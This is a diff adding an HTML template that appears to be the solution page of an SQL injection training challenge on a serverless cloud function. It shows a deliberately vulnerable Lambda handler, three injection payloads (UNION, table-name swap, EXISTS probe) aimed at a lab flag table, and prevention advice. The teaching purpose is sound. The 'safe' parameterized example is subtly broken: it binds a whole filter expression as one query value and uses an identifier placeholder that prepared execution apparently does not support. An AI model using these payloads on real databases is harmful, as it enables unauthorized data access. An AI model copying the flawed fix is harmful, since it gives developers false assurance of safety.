@@ -1,0 +1,281 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 18{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 18 - SQL Injection in Cloud Functions</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability in a serverless cloud function. Serverless cloud functions are a modern computing model where code runs in response to events without the need to manage servers. These functions are commonly used for data processing, API backends, and automation tasks.
+                </p>
+                <p>
+                    The vulnerability occurs because:
+                </p>
+                <ul>
+                    <li>The cloud function processes data from event triggers</li>
+                    <li>This data is used directly in SQL queries without proper validation or parameterization</li>
+                    <li>The function fails to properly sanitize or escape special characters in the input data</li>
+                </ul>
+                <p>
+                    This type of vulnerability is particularly dangerous because cloud functions often have broad permissions to access various resources, and serverless architectures may have less security oversight than traditional applications.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the cloud function processes the event data and uses it in SQL queries. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (Node.js AWS Lambda function)
+exports.handler = async (event) => {
+  // Extract values from the event
+  const action = event.action;
+  const dataset = event.dataset;
+  const filter = event.filter;
+  const format = event.format || 'json';
+
+  if (action === 'processData') {
+    try {
+      // Connect to the database
+      const connection = await mysql.createConnection({
+        host: process.env.DB_HOST,
+        user: process.env.DB_USER,
+        password: process.env.DB_PASSWORD,
+        database: process.env.DB_NAME
+      });
+
+      // Vulnerable SQL query
+      const query = `SELECT * FROM ${dataset} WHERE ${filter} LIMIT 1000`;
+      console.log(`Executing query: ${query}`);
+
+      // Execute the query
+      const [results] = await connection.execute(query);
+
+      // Format and return the results
+      return {
+        statusCode: 200,
+        body: format === 'json' ? JSON.stringify(results) : formatAsCsv(results)
+      };
+    } catch (error) {
+      console.error(`Error processing data: ${error.message}`);
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ error: 'Internal server error' })
+      };
+    }
+  } else {
+    return {
+      statusCode: 400,
+      body: JSON.stringify({ error: 'Invalid action' })
+    };
+  }
+};</code></pre>
+                <p>
+                    The vulnerability is in the direct use of <code>dataset</code> and <code>filter</code> parameters in the SQL query without proper sanitization or parameterization.
+                </p>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Understand the Event Format</h4>
+                <p>
+                    First, we need to understand the format of the events processed by the cloud function. Based on the challenge description and the default event template, the function expects events with several fields:
+                </p>
+                <ul>
+                    <li><code>action</code>: The operation to perform (e.g., "processData")</li>
+                    <li><code>dataset</code>: The name of the dataset to query</li>
+                    <li><code>filter</code>: The filter condition for the SQL query</li>
+                    <li><code>format</code>: The output format (e.g., "json")</li>
+                </ul>
+
+                <h4>2. Identify the Vulnerable Parameters</h4>
+                <p>
+                    Based on the challenge description and the event format, both the <code>dataset</code> and <code>filter</code> parameters are likely vulnerable to SQL injection. The <code>dataset</code> parameter is used directly in the SQL query without quotes, while the <code>filter</code> parameter is also used directly in the query.
+                </p>
+
+                <h4>3. Craft a SQL Injection Payload for the Filter Parameter</h4>
+                <p>
+                    We can craft a payload that exploits the SQL injection vulnerability in the <code>filter</code> parameter to access the restricted table mentioned in the developer note:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "processData",
+  "dataset": "sales_2023",
+  "filter": "1=1 UNION SELECT * FROM security_flags",
+  "format": "json"
+}</code></pre>
+                </div>
+                <p>
+                    When this event is processed, the resulting SQL query will be:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT * FROM sales_2023 WHERE 1=1 UNION SELECT * FROM security_flags LIMIT 1000</code></pre>
+                <p>
+                    This query will return all rows from the sales_2023 table as well as all rows from the security_flags table, which contains the flag.
+                </p>
+
+                <h4>4. Alternative Approach: Exploiting the Dataset Parameter</h4>
+                <p>
+                    We can also exploit the <code>dataset</code> parameter, which is used directly in the SQL query without quotes:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "processData",
+  "dataset": "security_flags",
+  "filter": "1=1",
+  "format": "json"
+}</code></pre>
+                </div>
+                <p>
+                    This will cause the function to execute:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT * FROM security_flags WHERE 1=1 LIMIT 1000</code></pre>
+                <p>
+                    This query will directly access the security_flags table, which contains the flag.
+                </p>
+
+                <h4>5. More Advanced Approach: Using Subqueries</h4>
+                <p>
+                    For a more sophisticated approach, we can use a subquery in the <code>filter</code> parameter:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>{
+  "action": "processData",
+  "dataset": "sales_2023",
+  "filter": "1=1 AND EXISTS (SELECT flag FROM security_flags WHERE flag LIKE 'R00T%')",
+  "format": "json"
+}</code></pre>
+                </div>
+                <p>
+                    This will cause the function to execute:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT * FROM sales_2023 WHERE 1=1 AND EXISTS (SELECT flag FROM security_flags WHERE flag LIKE 'R00T%') LIMIT 1000</code></pre>
+                <p>
+                    This query will return rows from the sales_2023 table only if there is a flag in the security_flags table that starts with 'R00T'.
+                </p>
+
+                <h4>6. Invoke the Function with the Malicious Event</h4>
+                <p>
+                    To exploit the vulnerability, we need to invoke the cloud function with our crafted event. In the challenge interface, we can paste our payload into the Event Data textarea and click the "Invoke Function" button.
+                </p>
+                <p>
+                    When the function processes our event, it will execute the injected SQL query and return the flag from the security_flags table.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    SQL injection vulnerabilities in cloud functions are particularly relevant in:
+                </p>
+                <ul>
+                    <li><strong>Data Processing Pipelines</strong>: ETL functions that process and transform data from various sources</li>
+                    <li><strong>Serverless APIs</strong>: API backends implemented as cloud functions that interact with databases</li>
+                    <li><strong>Event-Driven Applications</strong>: Functions that respond to events from message queues, storage changes, or other triggers</li>
+                    <li><strong>Microservices Architectures</strong>: Small, focused services that may use cloud functions for specific tasks</li>
+                </ul>
+                <p>
+                    The impact of these vulnerabilities can be severe:
+                </p>
+                <ul>
+                    <li>Unauthorized access to sensitive business data</li>
+                    <li>Exposure of customer information</li>
+                    <li>Cross-account data leakage</li>
+                    <li>Complete compromise of the database</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent SQL injection vulnerabilities in cloud functions, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (Node.js AWS Lambda function)
+exports.handler = async (event) => {
+  // Extract values from the event
+  const action = event.action;
+  const dataset = event.dataset;
+  const filter = event.filter;
+  const format = event.format || 'json';
+
+  // Validate dataset against allowed values
+  const allowedDatasets = ['sales_2023', 'customers_2023', 'products_2023'];
+  if (!allowedDatasets.includes(dataset)) {
+    return {
+      statusCode: 400,
+      body: JSON.stringify({ error: 'Invalid dataset' })
+    };
+  }
+
+  if (action === 'processData') {
+    try {
+      // Connect to the database
+      const connection = await mysql.createConnection({
+        host: process.env.DB_HOST,
+        user: process.env.DB_USER,
+        password: process.env.DB_PASSWORD,
+        database: process.env.DB_NAME
+      });
+
+      // Safe parameterized query
+      const query = 'SELECT * FROM ?? WHERE ? LIMIT 1000';
+      console.log(`Executing query with parameters: ${dataset}, ${filter}`);
+
+      // Execute the query with parameters
+      const [results] = await connection.execute(query, [dataset, filter]);
+
+      // Format and return the results
+      return {
+        statusCode: 200,
+        body: format === 'json' ? JSON.stringify(results) : formatAsCsv(results)
+      };
+    } catch (error) {
+      console.error(`Error processing data: ${error.message}`);
+      return {
+        statusCode: 500,
+        body: JSON.stringify({ error: 'Internal server error' })
+      };
+    }
+  } else {
+    return {
+      statusCode: 400,
+      body: JSON.stringify({ error: 'Invalid action' })
+    };
+  }
+};</code></pre>
+                    </li>
+                    <li>
+                        <strong>Validate and Sanitize Event Data</strong>:
+                        <ul>
+                            <li>Validate input types and formats</li>
+                            <li>Use whitelists for allowed values</li>
+                            <li>Implement JSON Schema validation for events</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Implement Proper Access Controls</strong>:
+                        <ul>
+                            <li>Use the principle of least privilege for function permissions</li>
+                            <li>Implement database-level access controls</li>
+                            <li>Use separate database users for different functions</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Use Cloud Security Best Practices</strong>:
+                        <ul>
+                            <li>Enable function logging and monitoring</li>
+                            <li>Use cloud security services to detect and prevent attacks</li>
+                            <li>Regularly audit function permissions and configurations</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level18') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
